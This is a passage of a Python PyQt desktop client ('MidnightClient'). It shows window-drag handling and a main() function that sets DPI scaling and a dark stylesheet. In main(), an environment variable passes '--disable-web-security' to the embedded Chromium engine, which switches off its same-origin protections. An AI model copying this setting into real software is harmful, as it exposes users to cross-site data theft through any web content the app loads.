            self.drag_position = event.globalPosition() - QPointF(self.frameGeometry().topLeft())
            event.accept()
        else:
            super().mousePressEvent(event)

    def mouseMoveEvent(self, event):
        """Updates the target position during a drag."""
        if event.buttons() == Qt.MouseButton.LeftButton and self.drag_position is not None:
            self.target_pos = event.globalPosition() - self.drag_position
            
            # --- MODIFY THIS BLOCK ---
            performance_mode = self.main_gui and self.main_gui.performance_mode_check.isChecked()
            if performance_mode:
                self.move(self.target_pos.toPoint())
            elif not self.drag_timer.isActive():
                self.drag_timer.start()
            # --- END MODIFY ---
            event.accept()
        else:
            super().mouseMoveEvent(event)

    def mouseReleaseEvent(self, event):
        """Resets the drag state when the mouse is released."""
        self.drag_position = None
        super().mouseReleaseEvent(event)



def main():
    os.environ['QTWEBENGINE_CHROMIUM_FLAGS'] = '--disable-web-security'
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    screen = app.primaryScreen()
    dpi = screen.logicalDotsPerInch()
    scale_factor = dpi / 96.0
    print(f"[INFO] Detected system scale factor: {scale_factor * 100:.0f}% (DPI: {dpi})")
    def scale(value):
        return int(value * scale_factor)
    set_application_icon(app)
    app.setStyle('Fusion')
    QToolTip.setFont(QFont('Segoe UI', 9))
    app.setStyleSheet("""
        QToolTip {
            color: #ffffff;
            background-color: #2a3342;
            border: 1px solid #3b465a;
            border-radius: 4px;
        }
        QMessageBox {
            background-color: #1A202C;
        }
        QMessageBox QLabel {
            color: #E2E8F0;
            font-size: 14px;
        }
        QMessageBox QPushButton {
            background-color: #2D3748;
            color: #E2E8F0;
            border: 1px solid #4A5568;
            border-radius: 4px;
            padding: 8px 16px;
            min-width: 80px;
        }
        QMessageBox QPushButton:hover {
            background-color: #4A5568;
        }
        QMessageBox QPushButton:pressed {
            background-color: #1A202C;
        }
        QInputDialog {
            background-color: #1A202C;
            color: #E2E8F0;
        }
        QInputDialog QLabel {
            color: #E2E8F0;
        }
        QInputDialog QLineEdit {
            background-color: #2D3748;
            color: #E2E8F0;
            border: 1px solid #4A5568;
        }
        QInputDialog QPushButton {
            background-color: #2D3748;
            color: #E2E8F0;
            border: 1px solid #4A5568;
        }
    """)
    window = MidnightClient(scale_func=scale)
    window.show()
    sys.exit(app.exec())
if __name__ == "__main__":
    main()





